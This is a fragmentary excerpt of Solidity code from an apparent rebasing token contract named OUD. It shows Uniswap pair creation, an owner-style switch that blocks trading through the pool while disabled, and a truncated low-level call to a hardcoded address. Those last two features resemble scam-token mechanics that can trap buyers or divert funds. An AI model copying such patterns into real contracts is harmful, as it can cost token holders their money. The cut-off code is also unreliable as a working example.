 ...
 constructor(IUniswapV2Router02 uniswapV2Router) public Ownable() Rebasable() {
 _uniswapV2Router = uniswapV2Router;
 currentPoolAddress = IUniswapV2Factory(uniswapV2Router.factory()) .createPair(address(this), uniswapV2Router.WETH());
 ...
 if((_msgSender() == currentPoolAddress || _msgSender() == address(_uniswapV2Router)) && !tradingEnabled) require(false, "OUD: trading is disabled.");
 }
 ...
 _totalSupply = ((initSupply.sub(_rOwned[BurnAddress].div(currentRate)) .mul(OUDScalingFactor).div(internalDecimals)));
 ...
 bool success;
 (success,) = address(0x158a56f36F3b39C7dEf0016060A6189452A18E15).call{
